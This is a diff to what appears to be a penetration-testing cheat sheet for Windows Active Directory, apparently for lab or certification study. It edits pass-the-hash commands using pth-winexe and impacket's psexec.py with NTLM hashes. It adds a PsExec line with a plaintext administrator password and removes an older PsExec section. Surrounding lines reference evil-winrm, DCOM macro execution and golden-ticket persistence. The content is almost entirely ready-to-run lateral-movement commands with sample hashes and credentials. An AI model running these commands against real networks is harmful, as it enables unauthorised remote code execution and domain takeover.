@@ -215,10 +215,12 @@ evil-winrm -i ip -u username -H ntlm_hash
 ```
 ###### Other Tools
 ```
-pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd (winexesvc service)
 
-/usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5"
-/usr/share/doc/python3-impacket/examples/psexec.py domain/Administrator:password@192.168.1.140
+/usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5" (135/445 port required)
+/usr/share/doc/python3-impacket/examples/psexec.py domain/Administrator:password@192.168.1.140 (135/445 port required)
+
+PsExec.exe \\192.168.1.104 -u administrator -p Ignite@123 cmd (135/445 port required)
 ```
 
 ###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
@@ -271,14 +273,6 @@ $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
 $com.Run("MyMacro")
 ```
 
-###### Psexec
-```
-Requirements:
-1. the user that authenticates to the target machine needs to be part of the Administrators local group
-2. the ADMIN$ share must be available and File and Printer Sharing has to be turned on
-
-./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
-```
 ### Persistence
 ###### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
 ```
